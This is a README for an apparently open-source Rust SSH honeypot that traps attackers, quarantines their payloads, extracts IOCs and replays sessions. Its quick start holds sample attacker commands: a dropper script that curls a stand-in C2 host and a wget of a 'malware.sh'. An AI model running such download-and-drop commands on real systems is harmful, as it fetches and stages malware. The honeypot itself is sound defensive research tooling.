<div align="center">

# 🛡️ AEGIS HONEYPOT

**Next-Generation, Zero-Execution SSH Threat Intelligence & Deception Engine in Rust**

[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Linux%20x86__64-lightgrey.svg?style=flat-square&logo=linux)](https://kernel.org)
[![Security: Sandboxed](https://img.shields.io/badge/security-Zero--Execution%20Sandbox-green.svg?style=flat-square)](https://github.com)
[![eBPF](https://img.shields.io/badge/telemetry-eBPF%20%2B%20OverlayFS-purple.svg?style=flat-square)](https://ebpf.io/)

<p align="center">
  <a href="#-demo">Demo</a> •
  <a href="#-key-features">Key Features</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-telemetry--events">Telemetry</a> •
  <a href="#-forensics--payload-quarantine">Forensics</a> •
  <a href="#-geoip-tagging">GeoIP</a> •
  <a href="#-deployment">Deployment</a>
</p>

</div>

---

## 🎬 Demo

https://github.com/user-attachments/assets/392aacb4-efa9-464d-b653-206380671a88

*An attacker SSHes in, drops a payload, and gets quarantined & fingerprinted in real time — the dashboard updates live over Server-Sent Events, then replays the attacker's exact terminal session in-browser.*

---

## 📖 Overview

**Aegis** is a modular, high-performance interactive SSH honeypot engineered in **Rust** designed to deceive, trap, and analyze automated botnets, script kiddies, and advanced threat actors.

Unlike traditional honeypots that either run high-risk real virtual machines (prone to escapes and outbound abuse) or basic low-interaction emulators (easily fingerprinted and bypassed), **Aegis** pairs an authentic **Ubuntu 22.04 LTS Golden Rootfs** and **ephemeral per-session Linux OverlayFS mounts** with a **deterministic zero-execution virtual shell** and **in-kernel eBPF telemetry**.

---

## ✨ Key Features

- 🔒 **Zero-Execution Sandbox:** Attacker commands are deterministically handled by an async dispatcher. No malicious code is ever executed on the host system.
- 📂 **Ephemeral OverlayFS Mount Isolation:** Each connection receives an isolated file system layer backed by a Golden Rootfs. Attacker file modifications (`touch`, `mkdir`, `echo > file`, `wget`) are trapped in private memory/disk `upperdir` instances and never leak between sessions.
- 🕵️ **Anti-Fingerprinting Engine:** Emulates OpenSSH 9.6p1 protocol characteristics, banners, and authentic Ubuntu 22.04 LTS directory structures (`/proc`, `/sys`, `/etc`, `/var/log`, `/dev`, `/boot`) to defeat scanners like Shodan and Censys.
- 🔬 **Automated In-Flight Forensics & IOC Extraction:** Intercepts downloaded scripts and binaries, calculates SHA-256 hashes, quarantines artifacts with stripped execution permissions (`0600`), and automatically parses Indicators of Compromise (C2 IPs, domains, URLs, Monero wallets).
- ⚡ **Kernel eBPF Telemetry Probes:** Optional Aya-based tracepoints hook kernel syscalls (`sys_enter_execve`, `sys_enter_connect`, `sys_enter_memfd_create`) to detect fileless ELF injection and outbound C2 callbacks.
- 📼 **Stroke-by-Stroke Terminal Replay:** Every session is recorded in Asciinema v2 (`.cast`) format for exact terminal session playback.
- 📊 **Real-Time Structured SIEM Feed:** Emits clean, append-only JSON Lines (`attacks.json`) ready for ingestion into Splunk, Elastic, Graylog, or custom SOC pipelines.

---

## 🏗️ Architecture

```
                                    +-------------------------------------------------------+
                                    |                Incoming SSH Attacker                  |
                                    +-------------------------------------------------------+
                                                                |
                                                                v
                                    +-------------------------------------------------------+
                                    |        aegis-gateway (Async russh Frontend)           |
                                    |        - OpenSSH 9.6p1 Protocol Spoofing              |
                                    |        - Credential Harvesting                        |
                                    +-------------------------------------------------------+
                                           /                    |                    \
                                          /                     |                     \
                                         v                      v                      v
        +----------------------------------+  +-----------------------------------+  +----------------------------------+
        |            aegis-vmm             |  |          aegis-collector          |  |            aegis-ebpf            |
        |  - Golden Rootfs Provisioning    |  |  - Event Pipeline Channel         |  |  - Kernel Tracepoints            |
        |  - Per-Session OverlayFS Mount   |  |  - attacks.json Log Stream        |  |  - execve / connect Probes       |
        |  - UpperDir Diff Isolation       |  |  - Asciinema v2 (.cast) Recorder  |  |  - memfd_create Fileless Watch   |
        +----------------------------------+  +-----------------------------------+  +----------------------------------+
                         |                                      |                                      |
                         v                                      v                                      v
        +----------------------------------+  +-----------------------------------+  +----------------------------------+
        |         aegis-forensics          |  |          attacks.json             |  |         quarantine/              |
        |  - SHA-256 Carving & Magic Bytes |  |  {"event":"COMMAND_RUN", ...}     |  |  chmod 0600 Quarantined Payloads |
        |  - IOC Parsing (IPs, URLs, C2)   |  |  {"event":"PAYLOAD_CAPTURED",...} |  |  Named by SHA-256 hash           |
        +----------------------------------+  +-----------------------------------+  +----------------------------------+
```

---

## 📦 Workspace Crates

| Crate | Path | Description |
| :--- | :--- | :--- |
| **`aegis-gateway`** | `crates/aegis-gateway` | Async SSH daemon, virtual shell engine, VFS dispatcher, and OpenSSH spoofing. |
| **`aegis-vmm`** | `crates/aegis-vmm` | Linux namespace manager, Golden Rootfs provisioner, and ephemeral OverlayFS mounts. |
| **`aegis-forensics`** | `crates/aegis-forensics` | File carving, SHA-256 hashing, string analysis, and IOC extraction. |
| **`aegis-collector`** | `crates/aegis-collector` | High-throughput telemetry pipeline, JSON log aggregator, and `.cast` session recorder. |
| **`aegis-ebpf`** | `crates/aegis-ebpf` | Aya-powered eBPF probe loader and ring buffer telemetry consumer. |
| **`aegis-common`** | `crates/aegis-common` | Shared data schemas, event definitions, and configuration structs. |
| **`aegis-dashboard`** | `crates/aegis-dashboard` | Read-only web UI: tails `attacks.json`, streams live events over SSE, and replays session recordings in-browser. |

---

## 🚀 Quick Start

### 1. Prerequisites

- **Rust Toolchain:** Stable Rust (1.75+)
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
```

### 2. Build & Run

```bash
# Clone repository
git clone https://github.com/aegis-honeypot/aegis-honeypot.git
cd aegis-honeypot

# Build all workspace crates
cargo build --release

# Run daemon (listens on 0.0.0.0:2222 by default)
./target/release/aegis-gateway
```

### 3. Connect as Attacker

In a separate terminal, test the honeypot:

```bash
ssh root@127.0.0.1 -p 2222 -o StrictHostKeyChecking=no
```
*(Accepts any username/password combination)*

Try common attacker commands:
```bash
root@ubuntu-server-01:~# uname -a
root@ubuntu-server-01:~# cat /etc/os-release
root@ubuntu-server-01:~# mkdir -p /tmp/botnet
root@ubuntu-server-01:~# echo '#!/bin/bash\ncurl http://c2.example.com/payload.bin' > /tmp/botnet/dropper.sh
root@ubuntu-server-01:~# wget http://example.com/malware.sh
root@ubuntu-server-01:~# exit
```

### 4. Watch It Live

In a third terminal, start the dashboard (a separate, unprivileged process — it only reads `attacks.json`, never touches the sandbox or attacker traffic):

```bash
./target/release/aegis-dashboard deploy/config.toml
```

On first run it generates a random bearer token, saves it to `dashboard_token` (mode `0600`, path configurable via `token_path`), and logs it once:
```
Dashboard bearer token: 9f2c1a...  (64 hex chars)
```
Open **http://127.0.0.1:8080/?token=<that token>** the first time — the page stores it in `localStorage` and cleans the URL, so subsequent visits just need `http://127.0.0.1:8080`. Every route requires the token; the API accepts it as `Authorization: Bearer <token>` or, for the live-feed endpoint specifically (`EventSource` can't set custom headers), `?token=<token>`. Set `dashboard.require_auth = false` in the config to disable this entirely for local dev.

It binds to loopback only by default — see the `[dashboard]` section in Configuration below before exposing it elsewhere.

Click any session ID in the feed to drill down: full event timeline for that session, plus an in-browser replay of the actual terminal recording (`sessions/*.cast`) with play/pause and speed controls — no external player or CDN dependency, just a small bundled terminal-buffer emulator. Click a source IP anywhere to filter the feed to that attacker. Captured payloads get their own panel with expandable IOC details (extracted IPs, URLs, base64 blobs, Monero wallets).

---

## 📊 Telemetry & Events (`attacks.json`)

All activity is recorded in real time as JSON Lines in `attacks.json`:

```json
{"event":"CREDENTIAL_HARVEST","timestamp":"2026-08-28T03:38:15Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","username":"root","password":"password123","auth_method":"password"}
{"event":"SESSION_START","timestamp":"2026-08-28T03:38:15Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","port":54156,"geo":{"country":"Germany","city":"Frankfurt am Main","asn":"AS24940 Hetzner Online GmbH","lat":50.1188,"lon":8.6843}}
{"event":"COMMAND_RUN","timestamp":"2026-08-28T03:38:16Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","command":"uname -a"}
{"event":"COMMAND_RUN","timestamp":"2026-08-28T03:38:17Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","command":"mkdir -p /tmp/botnet"}
{"event":"PAYLOAD_CAPTURED","timestamp":"2026-08-28T03:38:20Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","source_url":"http://c2.example.com/payload.bin","sha256":"b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","size_bytes":1284,"quarantine_path":"./quarantine/b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","file_type":"shell","iocs":{"strings_preview":["#!/bin/bash"],"ip_addresses":["198.51.100.99"],"urls":["http://c2.example.com/payload.bin"],"base64_blobs":[],"monero_wallets":[]}}
{"event":"SESSION_END","timestamp":"2026-08-28T03:38:20Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","duration_secs":5.3}
```

### Event Reference

| Event | Description | Key Fields |
| :--- | :--- | :--- |
| `CREDENTIAL_HARVEST` | SSH auth attempt (passwords, pubkeys) | `username`, `password`, `auth_method`, `ip` |
| `SESSION_START` | Interactive PTY channel open | `session_id`, `ip`, `port`, `timestamp`, `geo` (optional — see [GeoIP Tagging](#-geoip-tagging)) |
| `COMMAND_RUN` | Command executed by attacker | `session_id`, `command`, `timestamp` |
| `PAYLOAD_CAPTURED` | Quarantined script, binary, or download | `sha256`, `size_bytes`, `quarantine_path`, `iocs` |
| `SYSCALL_EXECVE` | eBPF process execution probe | `pid`, `filename`, `argv` |
| `SYSCALL_CONNECT` | eBPF outbound socket connect probe | `pid`, `dest_ip`, `dest_port` |
| `SYSCALL_MEMFD_CREATE` | eBPF fileless ELF memory injection | `pid`, `name` |
| `SESSION_END` | Session disconnect and duration | `session_id`, `duration_secs` |

---

## 🔬 Forensics & Malware Quarantine

When an attacker drops a dropper script, downloads a payload via `wget`/`curl`, or compiles code in `/tmp`:

1. **Quarantine Storage (`quarantine/`):** The file is saved and named by its **SHA-256 hash** with restricted non-executable permissions (`chmod 0600`).
2. **IOC Extraction:** Indicators of Compromise are parsed on the fly (IPv4 addresses, URLs, C2 endpoints, base64 blobs, Monero wallet patterns).
3. **Session Replay (`sessions/*.cast`):** Replay the exact terminal session using [Asciinema](https://asciinema.org/):
   ```bash
   asciinema play sessions/session_id.cast
   ```

---

## 🌍 GeoIP Tagging

Every `SESSION_START` event can carry a `geo` object (country, city, ASN, lat/lon) resolved from a **local** MaxMind GeoLite2 database — no outbound API calls, no per-lookup network round trip. It's entirely optional: with nothing configured, `geo` is simply absent and nothing else about the honeypot is affected.

### Setup

1. Create a free MaxMind account: **https://www.maxmind.com/en/geolite2/signup**
2. Once logged in, generate a license key under **My License Keys**.
3. Download the databases you want (both are free, and independent of each other):
   - **GeoLite2-City** — country, city, latitude/longitude
   - **GeoLite2-ASN** — network/ASN ownership (e.g. "Hetzner Online GmbH") — a *separate* download; MaxMind never bundles ASN data into the City database
   ```bash
   # Using their CLI downloader (geoipupdate), or a direct authenticated URL:
   curl -o GeoLite2-City.tar.gz "https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-City&license_key=YOUR_KEY&suffix=tar.gz"
   tar xzf GeoLite2-City.tar.gz --strip-components=1 --wildcards '*/GeoLite2-City.mmdb'
   ```
4. Place the `.mmdb` file(s) wherever you like and point `[geoip]` at them in `deploy/config.toml`:
   ```toml
   [geoip]
   geoip_db_path = "./GeoLite2-City.mmdb"
   asn_db_path   = "./GeoLite2-ASN.mmdb"   # optional, independent of the above
   ```
5. Restart `aegis-gateway`. It logs which database(s) it loaded (or that GeoIP is disabled) once at startup.

**This data goes stale** — MaxMind rebuilds GeoLite2 roughly every two weeks and IP-to-location mappings drift over time (ISPs reassign blocks, ASNs get bought and sold). Re-download periodically; a monthly cron job pointed at the URL above is enough for a honeypot's purposes. A stale database doesn't break anything, it just slowly gets less accurate.

**Private/loopback/RFC1918 addresses are never sent to the database** — they'd never resolve to anything real. They're tagged `"country": "Local"` instead, so you can tell "this was a local test connection" apart from "we looked this up and MaxMind has no record for it" (`geo: null`).

---

## ⚙️ Configuration (`deploy/config.toml`)

```toml
[gateway]
bind_addr = "0.0.0.0"
port = 2222
max_sessions = 256                 # Global concurrent-session cap (enforced via a semaphore)
max_sessions_per_ip = 8            # Concurrent-session cap per source IP (0 disables)
max_connects_per_min_per_ip = 20   # New connections per IP per rolling 60s window (0 disables)
host_key_path = "./host_key.pem"   # Persisted & auto-generated on first run. Remove to use an ephemeral key.

[vmm]
rootfs_path = "./rootfs"
overlay_base = "./overlay"
memory_limit_mb = 256
cpu_quota_percent = 20

[forensics]
quarantine_dir = "./quarantine"
sessions_dir = "./sessions"
attacks_log = "./attacks.json"
string_min_len = 6

[logging]
level = "info"
json = false

[dashboard]
bind_addr = "127.0.0.1"          # Loopback by default
port = 8080
require_auth = true              # Bearer token on every request. Only disable for local dev.
token_path = "./dashboard_token" # Persisted & auto-generated on first run, same as host_key_path above.

[geoip]
# geoip_db_path = "./GeoLite2-City.mmdb"   # Optional. See the GeoIP Tagging section below.
# asn_db_path   = "./GeoLite2-ASN.mmdb"    # Optional and independent of the above.
```

**Why a persistent host key matters:** a returning attacker (or a scanner like Shodan/Censys) that sees a *different* SSH host key on every connection has effectively fingerprinted you as a honeypot that restarts per-session. `host_key_path` is generated once and reused across restarts; omit it only if you specifically want a fresh ephemeral key every run.

**Why per-IP admission control matters:** `max_sessions` alone caps total load, but a single botnet host can still fill the entire pool. `max_sessions_per_ip` and `max_connects_per_min_per_ip` bound both concurrency and reconnect rate per source IP before a sandbox or session recorder is ever provisioned for it.

---

## 🚢 Production Deployment

### Option A: Direct Port Redirection (`iptables`)
Run Aegis unprivileged on port `2222` and redirect standard SSH traffic:
```bash
# Redirect public port 22 to honeypot port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# Save iptables rules
sudo netfilter-persistent save
```

### Option B: Docker Container
```bash
docker build -f deploy/Dockerfile -t aegis-honeypot .

docker run -d \
  --name aegis \
  --restart unless-stopped \
  -p 2222:2222 \
  -v $(pwd)/quarantine:/opt/aegis/quarantine \
  -v $(pwd)/sessions:/opt/aegis/sessions \
  -v $(pwd)/attacks.json:/opt/aegis/attacks.json \
  aegis-honeypot
```

---

## 🛡️ Security Model

- **Safe Quarantine:** Quarantined binaries are written with permissions `0600` (read/write only by the honeypot user, execution strictly prohibited).
- **SSRF Shield:** In-flight payload downloads to RFC 1918 private IP ranges, loopback (`127.0.0.0/8`), and link-local addresses are rejected to prevent internal network scanning.
- **Resource Protection:** A global `tokio::sync::Semaphore` caps total concurrent sessions at `max_sessions`; a per-IP admission guard additionally caps concurrent sessions and connection rate per source IP (`max_sessions_per_ip`, `max_connects_per_min_per_ip`), rejecting excess connections before a sandbox or recorder is provisioned for them.
- **Persistent Host Key:** The SSH host key is generated once and reused across restarts (`host_key_path`), avoiding the fingerprintable tell of a host key that changes on every reconnect.
- **Dashboard Auth:** Every dashboard route requires a bearer token (auto-generated, persisted to `token_path`, constant-time compared) unless `require_auth` is explicitly disabled for local dev.

---

## 🧪 Testing

Run the full workspace automated test suite:

```bash
cargo test --workspace
```

---

## 📜 License

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for details.
